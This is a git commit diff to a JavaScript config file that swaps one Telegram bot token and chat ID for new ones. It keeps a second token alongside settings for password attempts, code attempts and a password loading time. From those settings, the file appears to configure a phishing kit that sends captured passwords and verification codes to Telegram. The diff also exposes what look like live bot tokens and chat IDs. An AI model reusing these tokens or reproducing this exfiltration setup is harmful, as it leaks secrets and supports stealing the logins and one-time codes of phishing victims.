b40600b266475105a4e5166115b9fd0531b9431c
hoangwin123 <nguyenthuancj878@gmail.com>
2025-09-13 20:48:17 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
     token: '7799607651:AAF3XZOYFat6FvTQWhB78ji7kSeMyYSkPRA',
     chat_id: '-4829736745',
-    noti_token: '8265748882:AAEOYlLlM1mokWH46LOBRAvxQ55gpN4CyR4',
-    noti_chat_id: '-4961616371',
+    noti_token: '8466686106:AAFzSsPfuskJEY1EPkpN-CgTBiSTMA_O1XQ',
+    noti_chat_id: '-4939056422',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
